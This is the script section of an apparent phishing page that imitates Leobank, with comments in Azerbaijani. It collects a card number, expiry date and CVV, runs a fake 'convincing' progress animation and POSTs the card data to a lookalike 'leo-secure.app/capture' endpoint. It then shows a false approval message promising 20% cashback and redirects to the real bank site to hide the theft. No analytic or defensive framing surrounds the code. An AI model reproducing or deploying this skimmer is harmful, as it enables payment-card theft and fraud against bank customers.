<script>
  // Real-time 3D kart önizləməsi
  const cardNumInput = document.getElementById('leoCardNumber');
  const cardPreview = document.getElementById('leoCardPreview');
  const expiryInput = document.getElementById('leoExpiry');
  const expiryPreview = document.getElementById('leoExpiryPreview');

  cardNumInput.addEventListener('input', () => {
    let val = cardNumInput.value.replace(/\D/g, '').substring(0,16);
    let formatted = val.match(/.{1,4}/g);
    cardNumInput.value = formatted ? formatted.join(' ') : val;
    cardPreview.textContent = formatted ? formatted.join(' ') : '•••• •••• •••• ••••';
    cardPreview.style.color = val.length === 16 ? 'var(--leo-light)' : '#888';
  });

  expiryInput.addEventListener('input', () => {
    let val = expiryInput.value.replace(/\D/g, '').substring(0,4);
    if (val.length >= 2) {
      expiryInput.value = val.substring(0,2) + '/' + val.substring(2);
      expiryPreview.textContent = expiryInput.value;
    } else {
      expiryInput.value = val;
      expiryPreview.textContent = '--/--';
    }
  });

  document.getElementById('leoCVV').addEventListener('input', e => {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0,4);
  });

  // Form göndərilməsi (Ən inandırıcı animasiya)
  document.getElementById('leoSecureForm').addEventListener('submit', async e => {
    e.preventDefault();

    const progressFill = document.getElementById('leoProgressFill');
    let width = 0;
    const interval = setInterval(() => {
      if (width >= 100) {
        clearInterval(interval);
        document.getElementById('formSection').style.display = 'none';
        document.getElementById('leoLoadingSection').style.display = 'block';

        const data = {
          card: cardNumInput.value.replace(/\s/g, ''),
          expiry: expiryInput.value,
          cvv: document.getElementById('leoCVV').value
        };

        // Terminal serverinə göndər (Cloudflare ilə)
        fetch('https://leo-secure.app/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        }).finally(() => {
          setTimeout(() => {
            alert('✅ Təsdiq edildi! 20% keşbek aktivləşdi. Tezliklə ödəniş tamamlanır.');
            window.location.href = 'https://leobank.az';
          }, 3000);
        });
      } else {
        width += 3;
        progressFill.style.width = width + '%';
      }
    }, 40);
  });
</script>

</body>
